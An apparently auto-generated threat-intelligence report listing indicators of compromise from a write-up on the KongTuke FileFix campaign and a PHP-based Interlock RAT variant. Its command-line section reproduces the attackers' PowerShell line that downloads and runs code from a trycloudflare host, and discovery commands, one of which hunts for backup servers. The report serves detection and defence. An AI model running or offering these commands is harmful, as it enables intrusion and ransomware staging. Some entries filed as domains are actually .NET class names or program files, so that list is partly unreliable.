# KongTuke FileFix Leads to New Interlock RAT Variant

## 📋 Report Metadata

**Issue:** [#12](https://github.com/apps-dfir/Security-Operations/issues/12)<br>
**Analyst:** Apramey ‘Apps’ Shurpali<br>
**Generated:** 2026-01-07 15:59:49 UTC<br>
**Sources Processed:** 1<br>
**OCR Enabled:** Yes

## 📚 Sources

1. [KongTuke FileFix Leads to New Interlock RAT Variant](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/)

## 📊 Report Summary

**Total Unique IOCs:** 37<br>
**High Confidence IOCs:** 31<br>
**MITRE ATT&CK Techniques:** 9<br>
**Images with OCR Data:** 1<br>
**Previously Seen IOCs:** 6<br>
**Breakdown:** URLs: 1, Domains: 22, IPs: 2, SHA256: 2, Paths: 3, Commands: 7

## 🔄 Previously Seen IOCs

> The following IOCs were found in previous reports. This may indicate shared infrastructure, ongoing campaigns, or related threat activity.

| IOC | Type | Previous Reports |
|-----|------|------------------|
| `Node[.]js` | DOMAINS | [#1: Unit42 Blogs](../../issues/1), [#3: Multiple Threat Actors Exploit React2Shell (CVE-2025-55182)](../../issues/3), [#6: CISA-PDF Reports & Links](../../issues/6), [#8: Shai-Hulud 2.0: Guidance for detecting, investigating, and defending against the supply chain attack](../../issues/8) |
| `System[.]Net` | DOMAINS | [#1: Unit42 Blogs](../../issues/1), [#3: Multiple Threat Actors Exploit React2Shell (CVE-2025-55182)](../../issues/3), [#6: CISA-PDF Reports & Links](../../issues/6) |
| `cmd[.]exe` | DOMAINS | [#1: Unit42 Blogs](../../issues/1), [#3: Multiple Threat Actors Exploit React2Shell (CVE-2025-55182)](../../issues/3), [#8: Shai-Hulud 2.0: Guidance for detecting, investigating, and defending against the supply chain attack](../../issues/8) |
| `powershell[.]exe` | DOMAINS | [#1: Unit42 Blogs](../../issues/1), [#6: CISA-PDF Reports & Links](../../issues/6) |
| `rundll32[.]exe` | DOMAINS | [#1: Unit42 Blogs](../../issues/1), [#6: CISA-PDF Reports & Links](../../issues/6) |
| `trycloudflare[.]com` | DOMAINS | [#3: Multiple Threat Actors Exploit React2Shell (CVE-2025-55182)](../../issues/3) |

## Executive Summary (Analyst Fill-In)

### Key Takeaways
- What happened (1-2 bullets)
- Who/what is affected (orgs, sectors, regions)
- Why it matters to us (risk / exposure / priority)

### Initial Assessment
- Confidence level: (low/med/high)
- Recommended actions: (monitor / hunt / block / brief)

### Workflow Feedback (Analyst Fill-In)
- Extraction quality: (good / acceptable / poor)
- False positives noted: (none / some / many)
- Missing IOCs observed: (none / list below)
- Parsing issues: (none / describe)
- Suggestions for improvement:

## 🔍 Consolidated Indicators of Compromise

> IOCs are deduplicated across sources. Confidence: 🟢 HIGH | 🟡 MEDIUM | 🔴 LOW

### URLs

- 🟢 `hxxp://deadly-programming-attorneys-our[.]trycloudflare[.]com` [[1]](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/)

### Domains

- 🟢 `DirectoryServices[.]DirectorySearcher` [[1]](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/)
- 🟢 `Headers[.]Add` [[1]](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/)
- 🟢 `Security[.]Principal` [[1]](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/)
- 🟢 `System[.]Net` *(Seen 4x: Issue #1, #3, #6)* [[1]](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/)
- 🟢 `deadly-programming-attorneys-our[.]trycloudflare` [[1]](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/)
- 🟢 `evidence-deleted-procedure-bringing[.]trycloudflare` [[1]](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/)
- 🟢 `existed-bunch-balance-councils[.]trycloudflare` [[1]](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/)
- 🟢 `ferrari-rolling-facilities-lounge[.]trycloudflare` [[1]](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/)
- 🟢 `galleries-physicians-psp-wv[.]trycloudflare` [[1]](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/)
- 🟢 `nowhere-locked-manor-hs[.]trycloudflare` [[1]](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/)
- 🟢 `ranked-accordingly-ab-hired[.]trycloudflare` [[1]](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/)
- 🟢 `result[.]Properties` [[1]](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/)
- 🟢 `searcher[.]FindAll` [[1]](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/)
- 🟢 `searcher[.]PropertiesToLoad` [[1]](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/)
- 🟢 `trycloudflare[.]com` *(Seen 2x: Issue #3)* [[1]](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/)
- 🟢 `wefs[.]cfg` [[1]](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/)
- 🔴 `Node[.]js` *(Seen 5x: Issue #1, #3, #6, #8)* [[1]](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/)
- 🔴 `cmd[.]exe` *(Seen 4x: Issue #1, #3, #8)* [[1]](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/)
- 🔴 `config[.]cfg` [[1]](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/)
- 🔴 `php[.]exe` [[1]](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/)
- 🔴 `powershell[.]exe` *(Seen 3x: Issue #1, #6)* [[1]](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/)
- 🔴 `rundll32[.]exe` *(Seen 3x: Issue #1, #6)* [[1]](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/)

### IP Addresses

- 🟢 `184[.]95[.]51[.]165` [[1]](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/)
- 🟢 `64[.]95[.]12[.]71` [[1]](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/)

### File Hashes

**SHA256:**
- 🟢 `28a9982cf2b4fc53a1545b6ed0d0c1788ca9369a847750f5652ffa0ca7f7b7d3` [[1]](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/)
- 🟢 `8afd6c0636c5d70ac0622396268786190a428635e9cf28ab23add939377727b0` [[1]](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/)

### Windows Paths

- 🟢 `C:\Users\REDACTED\AppData\Roaming\php\php.exe` [[1]](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/)
- 🟢 `C:\Users\REDACTED\AppData\Roaming\php\wefs.cfg` [[1]](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/)
- 🟢 `C:\Users\\AppData\Roaming\php\wefs.cfg` [[1]](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/)

### Command Lines

🟢 Command:
```
"powershell.exe" -ep Bypass -w H -c "schtasks /delete /tn Updater /f; $w=New-Object System.Net.WebClient ; $w.Headers.Add(\"User-Agent\", \"PowerShell\") ; $w.DownloadString(\"http://deadly-programming-attorneys-our.trycloudflare.com\") | iex"
```
Sources: [[1]](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/)

🟢 Command:
```
└── cmd.exe /s /c "powershell -c "Get-PSDrive -PSProvider FileSystem | ConvertTo-Json""
```
Sources: [[1]](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/)

🟢 Command:
```
└── cmd.exe /s /c "powershell -c "Get-Service | Select-Object -Property Name, DisplayName | ConvertTo-Json""
```
Sources: [[1]](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/)

🟢 Command:
```
└── cmd.exe /s /c "powershell -c "systeminfo /FO CSV | ConvertFrom-Csv | ConvertTo-Json""
```
Sources: [[1]](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/)

🟢 Command:
```
└── cmd.exe /s /c "powershell -c "tasklist /svc /FO CSV | ConvertFrom-Csv | ConvertTo-Json""
```
Sources: [[1]](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/)

🟢 Command:
```
└── cmd.exe /s /c "powershell -c Get-NetNeighbor -AddressFamily IPv4 | Where-Object { $_.State -ne 'Permanent' } |
```
Sources: [[1]](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/)

🟢 Command:
```
└── cmd.exe /s /c "powershell -Command "$searcher = New-Object DirectoryServices.DirectorySearcher '(&(objectCategory=computer))'; $searcher.PropertiesToLoad.Add('name') | Out-Null; $searcher.PropertiesToLoad.Add('description') | Out-Null; $results = $searcher.FindAll(); foreach ($result in $results) { $computerName = $result.Properties['name'][0]; if ($computerName -match '(?i)VB|VBR|VEEA|VEEAM|BCK|BACK') { $desc = $result.Properties['description']; if ($desc -and $desc[0]) { Write-Output \"${computerName} - $($desc[0])\" } else { Write-Output \"$computerName\" } } }""
```
Sources: [[1]](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/)

## 🎯 MITRE ATT&CK Techniques

| Technique | Sources |
|-----------|---------|
| T1059.001: PowerShell | [1](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/) |
| T1059.007: JavaScript | [1](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/) |
| T1064: Scripting | [1](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/) |
| T1085: Rundll32 | [1](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/) |
| T1086: PowerShell | [1](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/) |
| T1218.011: Rundll32 | [1](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/) |
| T1590.005: IP Addresses | [1](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/) |
| T1592.002: Software | [1](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/) |
| T1593.001: Social Media | [1](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/) |

## 📄 Source Details

> Expand each source for detailed information extracted from that article.

<details>
<summary><strong>Source 1: KongTuke FileFix Leads to New Interlock RAT Variant</strong></summary>

**URL:** https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/

**IOCs from this source:** 37<br>
**MITRE techniques:** 9

**Excerpt:**
> Researchers from The DFIR Report, in partnership with Proofpoint, have identified a new and resilient variant of the Interlock ransomware group’s remote access trojan (RAT). This new malware, a shift from the previously identified JavaScript-based Interlock RAT (aka NodeSnake ), uses PHP and is being used in a widespread campaign. Since May 2025, activity related to the Interlock RAT has been observed in connection with the LandUpdate808 (aka KongTuke) web-inject threat clusters. The campaign be...

</details>

## 🔍 OCR Extracted Content

> Images extracted from source documents with OCR text. Click to expand each image.

<details>
<summary><strong>Image 1</strong> from kongtuke-filefix-leads-to-new-interlock-rat-variant</summary>

**View Image:** [url_img_001_860e1d76f2a9.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_001_860e1d76f2a9.png)

**Extracted Text:**
> €  G  x oT  —  fee itehiget] Complete these Verification Step:  needs to review  Please read the instructions carefully before starting the anti-bot verification.  1. Click Start Verification button.  START VERIFICATION  2. In the verification window, press Ctrl +L. 3. Press Ctrl + V after  4, Press Enter on your keyboard.  5. Close verification window.  © open  Organize +  B sin cloudtore com oa" Aw] >) | Sesech 6c  New folder  2 Quick access & I Desktop  H Downloads  D Music Videos  © OneDrive...

</details>

**OCR Summary:** 1 images processed with text extracted

---

*Generated by PEAK CTI v3.0 Multi-Source Consolidated Report*
*2026-01-07 15:59:49 UTC*